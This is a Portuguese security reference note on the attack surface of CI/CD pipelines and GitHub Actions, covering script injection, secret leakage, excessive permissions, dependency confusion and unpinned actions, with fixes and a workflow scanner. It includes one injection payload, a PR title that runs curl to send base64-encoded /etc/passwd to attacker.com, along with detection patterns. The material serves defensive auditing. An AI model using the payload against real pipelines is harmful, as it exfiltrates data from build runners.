# CI/CD Pipeline Attack Surface

**Tags:** #alto #critico #cicd #github-actions #pipeline #supply-chain #devops
**OWASP:** A08:2021 — Software and Data Integrity Failures
**CVSS Base:** 9.0 (Crítico — execução no runner com acesso a secrets de produção)

---

## 📖 O que é

Pipelines CI/CD executam código com access tokens e segredos de produção. Um ataque aqui é **RCE direto na infraestrutura de deploy** — o atacante não precisa comprometer a aplicação.

---

## 🔍 `grep_search` Táticas

```
# Arquivos alvo: .github/workflows/*.yml
github.event.pull_request.title
github.event.pull_request.body
github.event.issue.title
github.head_ref
github.base_ref
write-all
echo.*secrets
print.*env
console.log.*process.env
permissions.*write-all
```

---

## 💣 Vulnerabilidades por Categoria

### 1. Script Injection em GitHub Actions

**Como funciona:** values de `github.event.*` controlados por usuários externos (qualquer pessoa que abra um PR ou Issue) são interpolados diretamente em `run:` → execução de comandos.

```yaml
# ❌ CRÍTICO — título do PR controlado pelo atacante
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print title
        run: echo "Building ${{ github.event.pull_request.title }}"
        #                    ↑ INJETÁVEL — atacante controla isso
```

**Exploit:** PR com título:
```
main"; curl https://attacker.com/$(cat /etc/passwd | base64) #
```

**Resultado:** Exfiltração de dados do runner para servidor do atacante.

```yaml
# ✅ CORRETO — usar variável de ambiente, não interpolação direta
steps:
  - name: Print title
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "Building $PR_TITLE"
    # O shell interpreta $PR_TITLE como string, não como código
```

---

### 2. Segredos Expostos em Logs

```yaml
# ❌ VULNERÁVEL — imprime secret nos logs públicos do Actions
steps:
  - run: echo ${{ secrets.DATABASE_URL }}
  - run: echo "Token is ${{ secrets.API_TOKEN }}"
  - run: printenv | grep -i secret
```

**Quando logs são públicos** (repos públicos): segredo exposto para o mundo.

---

### 3. Permissões Excessivas no Workflow

```yaml
# ❌ PERIGOSO — qualquer step pode modificar repo, criar releases
permissions: write-all

# ✅ CORRETO — princípio de menor privilégio
permissions:
  contents: read          # somente leitura do código
  pull-requests: write    # somente para comentar no PR
```

---

### 4. Dependency Confusion Attack

**Como funciona:** Se o projeto usa packages de registry interno (ex: Nexus/Artifactory) com nomes sem escopo (`@org/`), o atacante publica no NPM/PyPI público uma versão com número *maior*.  
O package manager prefere o público — código malicioso executado no build.

```json
// ❌ VULNERÁVEL — package interno sem escopo, sem registry fixo
{
  "dependencies": {
    "internal-utils": "1.0.0"
  }
}

// ✅ CORRETO — com escopo e registry explícito
{
  "dependencies": {
    "@mycompany/internal-utils": "1.0.0"
  }
}
```

`.npmrc` necessário:
```
@mycompany:registry=https://nexus.internal.company.com/repository/npm-group/
```

---

### 5. Uso de Actions de Terceiros sem Hash Pinning

```yaml
# ❌ VULNERÁVEL — versão de tag mutável (atacante pode mudar a tag)
- uses: actions/checkout@v3

# ✅ CORRETO — hash imutável
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
```

---

### 6. Self-Hosted Runners com Acesso à Rede Interna

```yaml
# ⚠️ PERIGO — se runners self-hosted têm acesso à rede interna
runs-on: self-hosted

# Qualquer PR de fork malicioso executa código com acesso às redes internas
# Mitigação: runners self-hosted somente para repos privados confiáveis
```

---

## 🧪 Script de Análise Estática de Workflows

```python
# .tmp/analyze_cicd.py
import os, re

WORKFLOW_DIR = ".github/workflows"
INJECTION_PATTERNS = [
    r'\$\{\{.*github\.event\.(pull_request|issue)\.(title|body|head_ref)',
    r'\$\{\{.*github\.head_ref',
    r'echo.*\$\{\{.*secrets\.',
    r'permissions:\s*write-all',
]

for root, dirs, files in os.walk(WORKFLOW_DIR):
    for f in files:
        if f.endswith('.yml') or f.endswith('.yaml'):
            path = os.path.join(root, f)
            content = open(path).read()
            for pattern in INJECTION_PATTERNS:
                matches = re.findall(pattern, content, re.MULTILINE)
                if matches:
                    print(f"[VULN] {path}: {pattern}")
                    print(f"  Matches: {matches}")
```

---

## 🔗 Chain Exploits

```
Script Injection em PR → execução no runner → acesso a secrets de produção
Dependency Confusion → código malicioso no build → backdoor no artefato deployado  
Action sem hash → atualização silenciosa da action → execução de código arbitrário
Runner self-hosted + PR de fork → acesso à rede interna via pipeline
Secrets em logs + repo público → comprometimento direto de produção
```

---

## 🛡️ Hardening Rápido de Pipeline

```yaml
# Template de workflow seguro
name: Secure Build
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read      # mínimo necessário

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # 1. Checkout com hash fixo
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

      # 2. Input externo via env var, nunca interpolado
      - name: Process PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "PR: $PR_TITLE"  # seguro — $PR_TITLE é variável de shell

      # 3. Secrets apenas onde necessário, nunca em echo
      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: ./deploy.sh  # o script usa $DEPLOY_KEY internamente
```

---

## 📌 Referências
- [[IaC Security — Docker Kubernetes Terraform]]
- [[Análise de Dependências por CVE]]
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Rhino Security Labs — Script Injection](https://rhinosecuritylabs.com/research/script-injection-attacks-in-github-actions/)
